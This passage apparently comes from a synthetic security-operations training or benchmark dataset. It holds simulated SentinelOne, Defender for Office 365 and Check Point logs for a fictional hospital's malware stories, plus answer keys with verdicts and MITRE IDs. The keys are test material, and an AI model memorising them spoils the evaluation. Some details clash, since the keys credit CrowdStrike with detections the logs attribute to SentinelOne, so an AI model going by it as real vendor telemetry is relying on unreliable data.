  "critical_process_disabled": false,
  "detect": false,
  "fs_operation_blocked": false,
  "handle_operation_downgraded": false,
  "inddet_mask": false,
  "indicator": false,
  "kill_action_failed": false,
  "kill_parent": false,
  "kill_process": true,
  "kill_subprocess": false,
  "operation_blocked": false,
  "policy_disabled": false,
  "process_blocked": false,
  "quaran
```

#### ANSWER KEY — cracked-software
- evt_crack_01_download: verdict=- mitre=- authored: WS-HR-1182 downloaded Office_Pro_2026_Activator_Setup.exe from fast-office-tools-download.top at 20:10, following a sponsored search result click.
- evt_crack_02_execute: verdict=tp mitre=T1204.002 authored: a.jones ran Office_Pro_2026_Activator_Setup.exe on WS-HR-1182 with explorer.exe as the parent process; the binary is unsigned.
- evt_crack_03_persist: verdict=tp mitre=T1053.005 authored: Office_Pro_2026_Activator_Setup.exe created a scheduled task named OfficeLicenseRefresh on WS-HR-1182 that runs C:\ProgramData\OfficeTools\svchelper.exe every 30 minutes.
- evt_crack_04_detect: verdict=tp mitre=T1053.005 authored: CrowdStrike Falcon quarantined svchelper.exe on WS-HR-1182 as a known trojan, removed the scheduled task, and terminated the installer.


## medcore — stack {} (effective products: company defaults)

### Background feed sample (benign noise)

- 2026-05-10T06:58:00.000Z | badge=ad | vendor=Windows Security | sev=informational | host=WS-MED-045 | user=n.smits | "Signed in to WS-MED-045"

LEGACY VIEW (no native module) raw:
```json
{
 "winlog.event_id": "4624",
 "winlog.event_data.LogonType": "2",
 "winlog.event_data.AuthenticationPackageName": "Kerberos",
 "winlog.event_data.WorkstationName": "WS-MED-045",
 "action_result": "allowed"
}
```

- 2026-05-10T09:55:00.000Z | badge=o365 | vendor=Microsoft Defender for Office 365 | sev=informational | host=- | user=n.smits | "HR email received from hr@medcorehealth.org — delivered to n.smits@medcorehealth.org"

NATIVE — Microsoft Defender for Office 365 (defender_o365/EmailEvents)
```json
{
 "time": "2026-05-10T09:55:09.0000000Z",
 "tenantId": "45ffe58f-f287-400c-a151-2a096f15c38c",
 "category": "AdvancedHunting-EmailEvents",
 "properties": {
  "Timestamp": "2026-05-10T09:55:00.0001845Z",
  "NetworkMessageId": "7e536d5b-4a2b-4903-b32d-08dc30387b4f",
  "InternetMessageId": "<20260510095500.E9F3A0D9B1@medcorehealth.org>",
  "SenderMailFromAddress": "hr@medcorehealth.org",
  "SenderFromAddress": "hr@medcorehealth.org",
  "SenderDisplayName": "",
  "SenderObjectId": "0238f7a6-4f3e-4b77-86ba-55ee9374bd6f",
  "SenderMailFromDomain": "medcorehealth.org",
  "SenderFromDomain": "medcorehealth.org",
  "SenderIPv4": "192.168.10.1",
  "SenderIPv6": "",
  "RecipientEmailAddress": "n.smits@medcorehealth.org",
  "RecipientObjectId": "0d224153-aba1-495f-932c-784d187c331f",
  "Subject": "May 2026 HR Bulletin — Staff Updates",
  "EmailClusterId": 3019480175165,
  "EmailDirection": "Intra-org",
  "DeliveryAction": "Delivered",
  "DeliveryLocation": "Inbox/folder",
  "ThreatTypes": "",
  "ThreatNames": "",
  "DetectionMethods": "",
  "ConfidenceLevel": "{\"Spam\":\"1\"}",
  "BulkComplaintLevel": 0,
  "EmailAction": "No action taken",
  "EmailActionPolicy": "",
  "EmailActionPolicyGuid": "",
  "AuthenticationDetails": "{\"SPF\":\"pass\",\"DKIM\":\"pass\",\"DMARC\":\"pass\",\"CompAuth\":\"pass\"}",
  "AttachmentCount": 0,
  "UrlCount": 0,
  "EmailLanguage": "en",
  "Connectors": "",
  "OrgLevelAction": "",
  "OrgLevelPolicy": "",
  "UserLevelAction": "",
  "UserLevelPolicy": "",
  "ReportId": "7e536d5b-4a2b-4903-b32d-08dc30387b4f-1529146446164464989-1",
  "AdditionalFields": "{}",
  "OriginalThreatTypes": "",
  "OriginalDetectionMethods": "",
  "OriginalConfidenceLevel": "{\"Spam\":\"1\"}",
  "To": "n.smits@medcorehealth.org",
  "Cc": "",
  "RecipientDomain": "medcorehealth.org",
  "EmailSize": 24624,
  "IsFirstContact": 0
 }
}
```

- 2026-05-10T02:30:00.000Z | badge=edr | vendor=SentinelOne | sev=informational | host=SRV-MEDCORE-EMR01 | user=- | "Windows Defender definitions updated on SRV-MEDCORE-EMR01"

NATIVE — SentinelOne Singularity (sentinelone/Process Creation)
```json
{
 "timestamp": "2026-05-10T02:30:00.000Z",
 "event.time": 1778380200000,
 "event.type": "Process Creation",
 "event.category": "process",
 "meta.event.name": "PROCESSCREATION",
 "event.id": "01KR7VGP20C2YCRCPWP08AT4RG_737",
 "trace.id": "01KR7VGP20C2YCRCPWP08AT4RG",
 "packet.id": "65D8C85056B96B1FFCC6E180F2730E48",
 "i.scheme": "edr",
 "i.version": "preprocess-lib-1.0",
 "dataSource.name": "SentinelOne",
 "dataSource.vendor": "SentinelOne",
 "dataSource.category": "security",
 "account.id": "1822094290004415789",
 "account.name": "Medcore",
 "site.id": "1856573321780923295",
 "site.name": "Medcore-HQ",
 "group.id": "1841242822768832435",
 "mgmt.id": "94579",
 "mgmt.url": "euce1-108.sentinelone.net",
 "mgmt.osRevision": "20348",
 "agent.uuid": "93e133806c50b7377fd03c3e14b958bc",
 "agent.version": "25.1.3.334",
 "endpoint.name": "SRV-MEDCORE-EMR01",
 "endpoint.os": "windows",
 "endpoint.type": "server",
 "os.name": "Windows Server 2022 Standard",
 "process.unique.key": "A7282BDCBA3E54B4",
 "src.process.name": "services.exe",
 "src.process.pid": 668,
 "src.process.uid": "781E6B30C454A347",
 "src.process.image.path": "C:\\Windows\\System32\\services.exe",
 "src.process.user": "NT AUTHORITY\\SYSTEM",
 "src.process.storyline.id": "C66F48EAF18D91C6",
 "src.process.isStorylineRoot": true,
 "src.process.signedStatus": "signed",
 "src.process.verifiedStatus": "verified",
 "src.process.publisher": "MICROSOFT WINDOWS",
 "tgt.process.name": "MsMpEng.exe",
 "tgt.process.pid": 2244,
 "tgt.process.uid": "A7282BDCBA3E54B4",
 "tgt.process.cmdline": "MsMpEng.exe",
 "tgt.process.image.binaryIsExecutable": true,
 "tgt.process.user": "NT AUTHORITY\\SYSTEM",
 "tgt.process.integrityLevel": "SYSTEM",
 "tgt.process.sessionId": 0,
 "tgt.process.startTime": 1778380200000,
 "tgt.process.storyline.id": "6A49DA14F9863930",
 "tgt.process.isStorylineRoot": true,
 "tgt.process.signedStatus": "signed",
 "tgt.process.verifiedStatus": "verified",
 "tgt.process.subsystem": "SYS_WIN32",
 "tgt.process.isNative64Bit": false,
 "tgt.process.isRedirectCmdProcessor": false
}
```


### Story: phishing-malware (foundation) — Phishing Attachment → Malware Execution → Workstation Compromise

- 2026-05-20T10:15:00.000Z | badge=o365 | vendor=Microsoft Defender for Office 365 | sev=medium | host=- | user=l.jansen | "Received an email"

NATIVE — Microsoft Defender for Office 365 (defender_o365/EmailEvents)
```json
{
 "time": "2026-05-20T10:15:02.0000000Z",
 "tenantId": "45ffe58f-f287-400c-a151-2a096f15c38c",
 "category": "AdvancedHunting-EmailEvents",
 "properties": {
  "Timestamp": "2026-05-20T10:15:00.0003072Z",
  "NetworkMessageId": "e7a91c4f-3b62-4d18-9e05-6c8f2a7b19e3",
  "InternetMessageId": "<3f8b2a71-shiptrack-delivery-48213@shiptrack-express.info>",
  "SenderMailFromAddress": "notifications@shiptrack-express.info",
  "SenderFromAddress": "notifications@shiptrack-express.info",
  "SenderDisplayName": "",
  "SenderObjectId": "",
  "SenderMailFromDomain": "shiptrack-express.info",
  "SenderFromDomain": "shiptrack-express.info",
  "SenderIPv4": "45.148.10.77",
  "SenderIPv6": "",
  "RecipientEmailAddress": "l.jansen@medcorehealth.org",
  "RecipientObjectId": "8a57f262-dc38-46f3-ac23-ce8d0de50f9f",
  "Subject": "Your Package Could Not Be Delivered — Action Required",
  "EmailClusterId": 3019487593948,
  "EmailDirection": "Inbound",
  "DeliveryAction": "Delivered",
  "DeliveryLocation": "Inbox/folder",
  "ThreatTypes": "Phish",
  "ThreatNames": "",
  "DetectionMethods": "{\"Phish\":[\"File detonation reputation\"]}",
  "ConfidenceLevel": "{\"Phish\":\"High\",\"Spam\":\"1\"}",
  "BulkComplaintLevel": 0,
  "EmailAction": "No action taken",
  "EmailActionPolicy": "",
  "EmailActionPolicyGuid": "",
  "AuthenticationDetails": "{\"SPF\":\"fail\",\"DKIM\":\"fail\",\"DMARC\":\"fail\",\"CompAuth\":\"fail\"}",
  "AttachmentCount": 1,
  "UrlCount": 0,
  "EmailLanguage": "en",
  "Connectors": "",
  "OrgLevelAction": "",
  "OrgLevelPolicy": "",
  "UserLevelAction": "",
  "UserLevelPolicy": "",
  "ReportId": "e7a91c4f-3b62-4d18-9e05-6c8f2a7b19e3-1465757906867309695-1",
  "AdditionalFields": "{}",
  "OriginalThreatTypes": "Phish",
  "OriginalDetectionMethods": "{\"Phish\":[\"File detonation reputation\"]}",
  "OriginalConfidenceLevel": "{\"Phish\":\"High\",\"Spam\":\"1\"}",
  "To": "l.jansen@medcorehealth.org",
  "Cc": "",
  "RecipientDomain": "medcorehealth.org",
  "EmailSize": 52582,
  "IsFirstContact": 1
 }
}
```

- 2026-05-20T10:21:00.000Z | badge=edr | vendor=SentinelOne | sev=high | host=WS-NURS-044 | user=l.jansen | "explorer.exe started Delivery_Notice_48213.pdf.exe on WS-NURS-044"

NATIVE — SentinelOne Singularity (sentinelone/Process Creation)
```json
{
 "timestamp": "2026-05-20T10:21:00.000Z",
 "event.time": 1779272460000,
 "event.type": "Process Creation",
 "event.category": "process",
 "meta.event.name": "PROCESSCREATION",
 "event.id": "01KS2EE9Q0YE8RAWCYCRG8W44E_921",
 "trace.id": "01KS2EE9Q0YE8RAWCYCRG8W44E",
 "packet.id": "2901C98F9C65A7496053DCBBD9B3C413",
 "i.scheme": "edr",
 "i.version": "preprocess-lib-1.0",
 "dataSource.name": "SentinelOne",
 "dataSource.vendor": "SentinelOne",
 "dataSource.category": "security",
 "account.id": "1822094290004415789",
 "account.name": "Medcore",
 "site.id": "1856573321780923295",
 "site.name": "Medcore-HQ",
 "group.id": "1823415222326874252",
 "mgmt.id": "94579",
 "mgmt.url": "euce1-108.sentinelone.net",
 "mgmt.osRevision": "26100",
 "agent.uuid": "35bce53651b590f923ed4f49cbb781cc",
 "agent.version": "25.1.3.334",
 "endpoint.name": "WS-NURS-044",
 "endpoint.os": "windows",
 "endpoint.type": "desktop",
 "os.name": "Windows 11 Enterprise",
 "process.unique.key": "F0D3E52228B10D7E",
 "src.process.name": "explorer.exe",
 "src.process.displayName": "Windows Explorer",
 "src.process.pid": 3140,
 "src.process.uid": "0E7140A8324FA1B7",
 "src.process.image.path": "C:\\Windows\\explorer.exe",
 "src.process.user": "MEDCORE\\l.jansen",
 "src.process.storyline.id": "A35C5D41270636E9",
 "src.process.isStorylineRoot": true,
 "src.process.signedStatus": "signed",
 "src.process.verifiedStatus": "verified",
 "src.process.publisher": "MICROSOFT WINDOWS",
 "tgt.process.name": "Delivery_Notice_48213.pdf.exe",
 "tgt.process.pid": 6624,
 "tgt.process.uid": "F0D3E52228B10D7E",
 "tgt.process.cmdline": "\"C:\\Users\\l.jansen\\Downloads\\Delivery_Notice_48213.pdf.exe\"",
 "tgt.process.image.path": "C:\\Users\\l.jansen\\Downloads\\Delivery_Notice_48213.pdf.exe",
 "tgt.process.image.sha256": "b233d674e7dc3fe283d858e8bbb0423c88dfba9b23eb9ca9ca9701c7da1186a8",
 "tgt.process.image.binaryIsExecutable": true,
 "tgt.process.user": "MEDCORE\\l.jansen",
 "tgt.process.integrityLevel": "MEDIUM",
 "tgt.process.sessionId": 1,
 "tgt.process.startTime": 1779272460000,
 "tgt.process.storyline.id": "F975DE0734B37BA1",
 "tgt.process.isStorylineRoot": true,
 "tgt.process.subsystem": "SYS_WIN32",
 "tgt.process.isNative64Bit": false,
 "tgt.process.isRedirectCmdProcessor": false
}
```

- 2026-05-20T10:21:45.000Z | badge=firewall | vendor=Check Point | sev=high | host=WS-NURS-044 | user=l.jansen | "WS-NURS-044 connected to shiptrack-updates-net.xyz"

NATIVE — Check Point Quantum Security Gateway (checkpoint/url_filtering)
```
<134>1 2026-05-20T10:21:45Z gw-hq-01 CheckPoint 26144 - [action:"Accept"; flags:"411908"; ifdir:"outbound"; ifname:"eth1"; logid:"0"; loguid:"{0x6a0d8b39,0x2a,0xdf2242d5,0x61ebba39}"; origin:"192.168.0.1"; originsicname:"CN=gw-hq-01,O=mgmt-hq.medcore-health.org.1f1d81"; sequencenum:"1"; time:"1779272505"; version:"5"; __policy_id_tag:"product=VPN-1 & FireWall-1[db_tag={B2E64C8C-4CD4-4694-9270-444DBF85F093};mgmt=mgmt-hq;date=1779148800;policy_name=Corp_Policy\]"; app_category:"Uncategorized"; app_id:"0"; app_risk:"0"; appi_name:"shiptrack-updates-net.xyz"; dst:"185.220.101.204"; inzone:"Internal"; layer_name:"Network"; layer_name:"Web Control"; layer_uuid:"e82764d6-ef09-4edf-b9f8-66db00e9d6b0"; layer_uuid:"d6d669fe-36b1-4f15-bdb1-c9fc091c3b23"; match_id:"23"; match_id:"33554439"; matched_category:"Uncategorized"; parent_rule:"0"; parent_rule:"23"; product:"URL Filtering"; proto:"6"; proxy_src_ip:"192.168.10.63"; resource:"https://shiptrack-updates-net.xyz"; rule_action:"Inline"; rule_action:"Accept"; rule_name:"ALLOW-OUTBOUND-HTTPS"; rule_name:"Allow uncategorized"; rule_uid:"4217f465-5c09-473e-8232-52b2f8718a3f"; rule_uid:"794c12fe-4f19-4040-999a-ac986e31682b"; outzone:"External"; s_port:"51204"; service:"443"; service_id:"https"; src:"192.168.10.63"; src_machine_name:"WS-NURS-044"; src_user_name:"l.jansen"; xlatesrc:"176.58.155.10"; xlatesport:"31503"; xlatedst:"0.0.0.0"; xlatedport:"0"]
```

- 2026-05-20T10:24:00.000Z | badge=edr | vendor=SentinelOne | sev=critical | host=WS-NURS-044 | user=l.jansen | "Threat detected on WS-NURS-044"

NATIVE — SentinelOne Singularity (sentinelone/threat)
```json
{
 "id": "1844013978012731255",
 "agentDetectionInfo": {
  "accountId": "1822094290004415789",
  "accountName": "Medcore",
  "agentDetectionState": null,
  "agentDomain": "MEDCORE",
  "agentIpV4": "10.40.71.89",
  "agentLastLoggedInUpn": "l.jansen@medcorehealth.org",
  "agentLastLoggedInUserName": "l.jansen",
  "agentMitigationMode": "protect",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentUuid": "35bce53651b590f923ed4f49cbb781cc",
  "agentVersion": "25.1.3.334",
  "externalIp": "176.58.155.10",
  "groupId": "1823415222326874252",
  "groupName": "Workstations",
  "siteId": "1856573321780923295",
  "siteName": "Medcore-HQ"
 },
 "agentRealtimeInfo": {
  "accountId": "1822094290004415789",
  "accountName": "Medcore",
  "activeThreats": 0,
  "agentComputerName": "WS-NURS-044",
  "agentDecommissionedAt": null,
  "agentDomain": "MEDCORE",
  "agentId": "1821172370182436541",
  "agentInfected": false,
  "agentIsActive": true,
  "agentIsDecommissioned": false,
  "agentMachineType": "desktop",
  "agentMitigationMode": "protect",
  "agentNetworkStatus": "connected",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentOsType": "windows",
  "agentUuid": "35bce53651b590f923ed4f49cbb781cc",
  "agentVersion": "25.1.3.334",
  "groupId": "1823415222326874252",
  "groupName": "Workstations",
  "networkInterfaces": [
   {
    "id": "1813429322366455649",
    "inet": [
     "10.40.71.89"
    ],
    "inet6": [
     "fe80::cf6f:673f:efe3:2b5d"
    ],
    "name": "Ethernet",
    "physical": "0F:E2:78:27:43:4B"
   }
  ],
  "operationalState": "na",
  "rebootRequired": false,
  "siteId": "1856573321780923295",
  "siteName": "Medcore-HQ",
  "userActionsNeeded": []
 },
 "containerInfo": {
  "id": null,
  "image": null,
  "labels": null,
  "name": null
 },
 "indicators": [
  {
   "category": "General",
   "description": "known_malware_family",
   "ids": [
    948
   ],
   "tactics": [
    {
     "name": "Execution",
     "source": "MITRE",
     "techniques": [
      {
       "link": "https://attack.mitre.org/techniques/T1204/002/",
       "name": "T1204.002"
      }
     ]
    }
   ]
  }
 ],
 "kubernetesInfo": {
  "cluster": null,
  "controllerKind": null,
  "controllerLabels": null,
  "controllerName": null,
  "namespace": null,
  "namespaceLabels": null,
  "node": null,
  "pod": null,
  "podLabels": null
 },
 "mitigationStatus": [
  {
   "action": "kill",
   "actionsCounters": {
    "failed": 0,
    "notFound": 0,
    "pendingReboot": 0,
    "success": 1,
    "total": 1
   },
   "agentSupportsReport": true,
   "groupNot
```

#### ANSWER KEY — phishing-malware
- evt_pm_01_email: verdict=tp mitre=T1566.001 authored: l.jansen received an email with a ZIP attachment (Delivery_Notice_48213.zip) from an external sender impersonating a shipping company. SPF and DKIM both failed.
- evt_pm_02_execute: verdict=tp mitre=T1204.002 authored: l.jansen extracted the ZIP and ran Delivery_Notice_48213.pdf.exe from the Downloads folder on WS-NURS-044; explorer.exe was the parent process.
- evt_pm_03_beacon: verdict=tp mitre=T1071.001 authored: WS-NURS-044 opened an outbound HTTPS session to shiptrack-updates-net.xyz, a domain registered 2 days ago; the firewall allowed the session.
- evt_pm_04_detect: verdict=tp mitre=T1204.002 authored: CrowdStrike Falcon quarantined Delivery_Notice_48213.pdf.exe on WS-NURS-044, matching a known commodity trojan signature (family: Glupteba-variant).


### Story: usb-malware (foundation) — Malicious USB Drive → Trojan Persistence → Workstation Compromise

- 2026-05-22T13:30:00.000Z | badge=edr | vendor=SentinelOne | sev=low | host=NRS-TERM-088 | user=nurse.vandijk | "USB_Backup_Tool.exe was copied from a removable USB drive (E:\) to the Desktop on NRS-TERM-088."

NATIVE — SentinelOne Singularity (sentinelone/File Creation)
```json
{
 "timestamp": "2026-05-22T13:30:00.000Z",
 "event.time": 1779456600000,
 "event.type": "File Creation",
 "event.category": "file",
 "meta.event.name": "FILECREATION",
 "event.id": "01KS7Y1SY08YPAR0E8CR66RJP2_809",
 "trace.id": "01KS7Y1SY08YPAR0E8CR66RJP2",
 "packet.id": "8723C569E13C3E4A91731D356F59F43A",
 "i.scheme": "edr",
 "i.version": "preprocess-lib-1.0",
 "dataSource.name": "SentinelOne",
 "dataSource.vendor": "SentinelOne",
 "dataSource.category": "security",
 "account.id": "1822094290004415789",
 "account.name": "Medcore",
 "site.id": "1856573321780923295",
 "site.name": "Medcore-HQ",
 "group.id": "1823415222326874252",
 "mgmt.id": "94579",
 "mgmt.url": "euce1-108.sentinelone.net",
 "mgmt.osRevision": "26100",
 "agent.uuid": "bfc170098943755acaed69d130fb9f82",
 "agent.version": "25.1.3.334",
 "endpoint.name": "NRS-TERM-088",
 "endpoint.os": "windows",
 "endpoint.type": "desktop",
 "os.name": "Windows 11 Enterprise",
 "tgt.file.path": "C:\\Users\\nurse.vandijk\\Desktop\\USB_Backup_Tool.exe",
 "tgt.file.extension": "exe",
 "tgt.file.size": 245760,
 "tgt.file.type": "PE",
 "tgt.file.isExecutable": true,
 "tgt.file.location": "Local",
 "tgt.file.creationTime": 1779456600000,
 "tgt.file.modificationTime": 1779456600000,
 "tgt.file.id": "E1006041828450ED086E",
 "tgt.file.sha256": "e5f78b3e3cd7901e89bfd8da08ff1dd412acf7452ba5027f031c6efe64e7196f",
 "tgt.file.isSigned": "unsigned"
}
```

- 2026-05-22T13:33:00.000Z | badge=edr | vendor=SentinelOne | sev=high | host=NRS-TERM-088 | user=nurse.vandijk | "explorer.exe started USB_Backup_Tool.exe on NRS-TERM-088"

NATIVE — SentinelOne Singularity (sentinelone/Process Creation)
```json
{
 "timestamp": "2026-05-22T13:33:00.000Z",
 "event.time": 1779456780000,
 "event.type": "Process Creation",
 "event.category": "process",
 "meta.event.name": "PROCESSCREATION",
 "event.id": "01KS7Y79Q0WP8JEEACM8RJ82AC_701",
 "trace.id": "01KS7Y79Q0WP8JEEACM8RJ82AC",
 "packet.id": "7507A92530C4F4543A182DB52A9F4E69",
 "i.scheme": "edr",
 "i.version": "preprocess-lib-1.0",
 "dataSource.name": "SentinelOne",
 "dataSource.vendor": "SentinelOne",
 "dataSource.category": "security",
 "account.id": "1822094290004415789",
 "account.name": "Medcore",
 "site.id": "1856573321780923295",
 "site.name": "Medcore-HQ",
 "group.id": "1823415222326874252",
 "mgmt.id": "94579",
 "mgmt.url": "euce1-108.sentinelone.net",
 "mgmt.osRevision": "26100",
 "agent.uuid": "bfc170098943755acaed69d130fb9f82",
 "agent.version": "25.1.3.334",
 "endpoint.name": "NRS-TERM-088",
 "endpoint.os": "windows",
 "endpoint.type": "desktop",
 "os.name": "Windows 11 Enterprise",
 "process.unique.key": "E972F8D4EB227D89",
 "src.process.name": "explorer.exe",
 "src.process.displayName": "Windows Explorer",
 "src.process.pid": 3140,
 "src.process.uid": "2DA66B78F8DDAE8E",
 "src.process.image.path": "C:\\Windows\\explorer.exe",
 "src.process.user": "MEDCORE\\nurse.vandijk",
 "src.process.storyline.id": "C4DC33986DAD8C7B",
 "src.process.isStorylineRoot": true,
 "src.process.signedStatus": "signed",
 "src.process.verifiedStatus": "verified",
 "src.process.publisher": "MICROSOFT WINDOWS",
 "tgt.process.name": "USB_Backup_Tool.exe",
 "tgt.process.pid": 7712,
 "tgt.process.uid": "E972F8D4EB227D89",
 "tgt.process.cmdline": "\"C:\\Users\\nurse.vandijk\\Desktop\\USB_Backup_Tool.exe\"",
 "tgt.process.image.path": "C:\\Users\\nurse.vandijk\\Desktop\\USB_Backup_Tool.exe",
 "tgt.process.image.sha256": "e5f78b3e3cd7901e89bfd8da08ff1dd412acf7452ba5027f031c6efe64e7196f",
 "tgt.process.image.binaryIsExecutable": true,
 "tgt.process.user": "MEDCORE\\nurse.vandijk",
 "tgt.process.integrityLevel": "MEDIUM",
 "tgt.process.sessionId": 1,
 "tgt.process.startTime": 1779456780000,
 "tgt.process.storyline.id": "DC2D1300BDA7646E",
 "tgt.process.isStorylineRoot": true,
 "tgt.process.subsystem": "SYS_WIN32",
 "tgt.process.isNative64Bit": false,
 "tgt.process.isRedirectCmdProcessor": false
}
```

- 2026-05-22T13:33:20.000Z | badge=edr | vendor=SentinelOne | sev=high | host=NRS-TERM-088 | user=nurse.vandijk | "A process set registry value SystemBackupSvc on NRS-TERM-088"

LEGACY VIEW (no native module) raw:
```json
{
 "crowdstrike.event_simpleName": "RegistryOperationDetectInfo",
 "crowdstrike.detection.description": "Registry Run key created pointing to a binary that was executed directly from removable media minutes earlier. Consistent with autostart persistence.",
 "crowdstrike.detection.scenario": "registry_persistence_removable_media",
 "crowdstrike.detection.technique": "Boot or Logon Autostart Execution: Registry Run Keys",
 "crowdstrike.detection.technique_id": "T1547.001",
 "event.action": "registry_value_set",
 "registry.path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemBackupSvc",
 "registry.key": "SystemBackupSvc",
 "registry.value": "C:\\Users\\nurse.vandijk\\Desktop\\USB_Backup_Tool.exe",
 "process.name": "USB_Backup_Tool.exe",
 "process.hash.sha256": "e5f78b3e3cd7901e89bfd8da08ff1dd412acf7452ba5027f031c6efe64e7196f",
 "host.name": "NRS-TERM-088",
 "user.name": "MEDCORE\\nurse.vandijk"
}
```

- 2026-05-22T13:35:00.000Z | badge=edr | vendor=SentinelOne | sev=critical | host=NRS-TERM-088 | user=nurse.vandijk | "Threat detected on NRS-TERM-088"

NATIVE — SentinelOne Singularity (sentinelone/threat)
```json
{
 "id": "1824155089222511343",
 "agentDetectionInfo": {
  "accountId": "1822094290004415789",
  "accountName": "Medcore",
  "agentDetectionState": null,
  "agentDomain": "MEDCORE",
  "agentIpV4": "10.30.6.209",
  "agentLastLoggedInUpn": "nurse.vandijk@medcorehealth.org",
  "agentLastLoggedInUserName": "nurse.vandijk",
  "agentMitigationMode": "protect",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentUuid": "bfc170098943755acaed69d130fb9f82",
  "agentVersion": "25.1.3.334",
  "externalIp": "176.58.155.10",
  "groupId": "1823415222326874252",
  "groupName": "Workstations",
  "siteId": "1856573321780923295",
  "siteName": "Medcore-HQ"
 },
 "agentRealtimeInfo": {
  "accountId": "1822094290004415789",
  "accountName": "Medcore",
  "activeThreats": 0,
  "agentComputerName": "NRS-TERM-088",
  "agentDecommissionedAt": null,
  "agentDomain": "MEDCORE",
  "agentId": "1832717606115114217",
  "agentInfected": false,
  "agentIsActive": true,
  "agentIsDecommissioned": false,
  "agentMachineType": "desktop",
  "agentMitigationMode": "protect",
  "agentNetworkStatus": "connected",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentOsType": "windows",
  "agentUuid": "bfc170098943755acaed69d130fb9f82",
  "agentVersion": "25.1.3.334",
  "groupId": "1823415222326874252",
  "groupName": "Workstations",
  "networkInterfaces": [
   {
    "id": "1853067851883012360",
    "inet": [
     "10.30.6.209"
    ],
    "inet6": [
     "fe80::b8f4:2095:5f2e:687b"
    ],
    "name": "Ethernet",
    "physical": "6B:22:96:93:40:AD"
   }
  ],
  "operationalState": "na",
  "rebootRequired": false,
  "siteId": "1856573321780923295",
  "siteName": "Medcore-HQ",
  "userActionsNeeded": []
 },
 "containerInfo": {
  "id": null,
  "image": null,
  "labels": null,
  "name": null
 },
 "indicators": [
  {
   "category": "Persistence",
   "description": "known_malware_family",
   "ids": [
    948
   ],
   "tactics": [
    {
     "name": "Persistence",
     "source": "MITRE",
     "techniques": [
      {
       "link": "https://attack.mitre.org/techniques/T1547/001/",
       "name": "T1547.001"
      }
     ]
    }
   ]
  }
 ],
 "kubernetesInfo": {
  "cluster": null,
  "controllerKind": null,
  "controllerLabels": null,
  "controllerName": null,
  "namespace": null,
  "namespaceLabels": null,
  "node": null,
  "pod": null,
  "podLabels": null
 },
 "mitigationStatus": [
  {
   "action": "kill",
   "actionsCounters": {
    "failed": 0,
    "notFound": 0,
    "pendingReboot": 0,
    "success": 1,
    "total": 1
   },
   "agentSupportsReport": t
```

#### ANSWER KEY — usb-malware
- evt_usb_01_copy: verdict=- mitre=- authored: USB_Backup_Tool.exe was copied from a removable USB drive (E:\) to the Desktop on NRS-TERM-088.
- evt_usb_02_execute: verdict=tp mitre=T1204.002 authored: nurse.vandijk ran USB_Backup_Tool.exe on NRS-TERM-088 with explorer.exe as the parent process; the binary is unsigned.
- evt_usb_03_persist: verdict=tp mitre=T1547.001 authored: USB_Backup_Tool.exe wrote a Registry Run key on NRS-TERM-088 that relaunches it at every nurse.vandijk logon.
- evt_usb_04_detect: verdict=tp mitre=T1547.001 authored: CrowdStrike Falcon quarantined USB_Backup_Tool.exe on NRS-TERM-088 as a known trojan dropper and removed its Registry Run key.


### Story: browser-extension (foundation) — Sideloaded Browser Extension → PowerShell Spawned by Chrome

- 2026-05-25T09:00:00.000Z | badge=edr | vendor=SentinelOne | sev=low | host=WS-NURS-044 | user=dr.peters | "explorer.exe started chrome.exe on WS-NURS-044"

NATIVE — SentinelOne Singularity (sentinelone/Process Creation)
```json
{
 "timestamp": "2026-05-25T09:00:00.000Z",
 "event.time": 1779699600000,
 "event.type": "Process Creation",
 "event.category": "process",
 "meta.event.name": "PROCESSCREATION",
 "event.id": "01KSF5SJM0T84PRWTE08GE0AET_171",
 "trace.id": "01KSF5SJM0T84PRWTE08GE0AET",
 "packet.id": "EB415A2C9F7ADF8CE750794EFAF2650E",
 "i.scheme": "edr",
 "i.version": "preprocess-lib-1.0",
 "dataSource.name": "SentinelOne",
 "dataSource.vendor": "SentinelOne",
 "dataSource.category": "security",
 "account.id": "1822094290004415789",
 "account.name": "Medcore",
 "site.id": "1856573321780923295",
 "site.name": "Medcore-HQ",
 "group.id": "1823415222326874252",
 "mgmt.id": "94579",
 "mgmt.url": "euce1-108.sentinelone.net",
 "mgmt.osRevision": "26100",
 "agent.uuid": "35bce53651b590f923ed4f49cbb781cc",
 "agent.version": "25.1.3.334",
 "endpoint.name": "WS-NURS-044",
 "endpoint.os": "windows",
 "endpoint.type": "desktop",
 "os.name": "Windows 11 Enterprise",
 "process.unique.key": "BE83064289D704F0",
 "src.process.name": "explorer.exe",
 "src.process.displayName": "Windows Explorer",
 "src.process.pid": 3140,
 "src.process.uid": "0E7140A8324FA1B7",
 "src.process.image.path": "C:\\Windows\\explorer.exe",
 "src.process.user": "MEDCORE\\dr.peters",
 "src.process.storyline.id": "A35C5D41270636E9",
 "src.process.isStorylineRoot": true,
 "src.process.signedStatus": "signed",
 "src.process.verifiedStatus": "verified",
 "src.process.publisher": "MICROSOFT WINDOWS",
 "tgt.process.name": "chrome.exe",
 "tgt.process.displayName": "Google Chrome",
 "tgt.process.pid": 8814,
 "tgt.process.uid": "BE83064289D704F0",
 "tgt.process.cmdline": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --load-extension=\"C:\\Users\\dr.peters\\Downloads\\perf_boost_ext_unpacked\"",
 "tgt.process.image.path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
 "tgt.process.image.binaryIsExecutable": true,
 "tgt.process.user": "MEDCORE\\dr.peters",
 "tgt.process.integrityLevel": "MEDIUM",
 "tgt.process.sessionId": 1,
 "tgt.process.startTime": 1779699600000,
 "tgt.process.storyline.id": "05724D10744DBC80",
 "tgt.process.isStorylineRoot": true,
 "tgt.process.subsystem": "SYS_WIN32",
 "tgt.process.isNative64Bit": false,
 "tgt.process.isRedirectCmdProcessor": false
}
```

- 2026-05-25T09:02:00.000Z | badge=edr | vendor=SentinelOne | sev=high | host=WS-NURS-044 | user=dr.peters | "chrome.exe started powershell.exe on WS-NURS-044"

NATIVE — SentinelOne Singularity (sentinelone/Process Creation)
```json
{
 "timestamp": "2026-05-25T09:02:00.000Z",
 "event.time": 1779699720000,
 "event.type": "Process Creation",
 "event.category": "process",
 "meta.event.name": "PROCESSCREATION",
